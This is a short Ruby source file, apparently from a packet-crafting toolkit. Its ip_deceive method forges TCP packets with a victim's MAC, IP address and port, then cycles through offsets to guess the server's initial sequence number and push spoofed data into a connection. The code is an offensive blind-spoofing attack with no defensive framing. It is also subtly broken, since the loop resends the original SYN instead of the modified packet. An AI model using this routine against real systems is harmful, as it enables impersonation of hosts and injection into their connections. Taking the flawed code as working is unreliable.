require_relative '../../protocol/tcp_pac.rb'

class TCPP
	def self.ip_deceive(pcap, isn, deviate_range, data, rtt=1)
		pac = TCPP.syn_pac{|pac|
			pac.etherh.src_mac = $victim_mac
			pac.ipv4h.set_addr_by_arr($victim_ip, :src)
			pac.tcph.src_port = $src_port
		}
		pac2 = TCPP.pac_from_pac(pac, :new){|p2|
			p2.tcph.seq_num = p2.tcph.seq_num_decimal+1
			p2.set_app_data(data)
		}

		pcap.send_packet(pac)
		sleep(rtt)

		deviate_range.each do |dr|
			pac2 = TCPP.pac_from_pac(pac2){|p2|
				p2.tcph.ack_num = isn+dr
			}
			pcap.send_packet(pac)
		end

	end
end